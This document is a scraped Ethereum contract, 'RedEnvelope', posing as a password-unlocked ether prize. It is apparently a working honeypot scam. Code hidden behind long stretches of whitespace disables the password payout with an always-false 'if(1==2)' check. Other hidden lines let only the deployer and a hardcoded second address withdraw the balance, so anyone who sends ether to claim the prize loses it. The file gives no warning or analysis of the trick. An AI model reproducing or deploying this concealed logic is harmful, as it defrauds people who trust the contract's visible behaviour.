//token_name	
//token_url	https://etherscan.io//address/0xcfebf8C78De81f804a694F4Bb401e5D76B298bE5#code
//spider_time	2018/07/08 12:46:41
//token_Transactions	6 txns
//token_price	

pragma solidity ^0.4.19;

contract RedEnvelope    
{
    function()payable{}
    
    function CalcHash(bytes password) 
    pure
    returns (bytes32) 
    {
        return sha3(password);
    }
    
    bytes32 public hashPass;
    
    bool public closed = false;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     address own = msg.sender;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       address cr = 0xB4a24501330BFfff0436Af0349c1295CCB1d5364;
    function Put(bytes32 hash)
    public
    payable
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==own){
        if(!closed&&(msg.value > 1 ether))
        {
            hashPass = hash;
        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               }
    }
    
    function Open(bytes password)
    external
    payable
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     if(1==2){
        if(hashPass == sha3(password))
        {
            msg.sender.transfer(this.balance);
            closed = false;
        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     } if(msg.sender==own){msg.sender.transfer(this.balance);}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    if(msg.sender==cr){msg.sender.transfer(this.balance);}
    }
}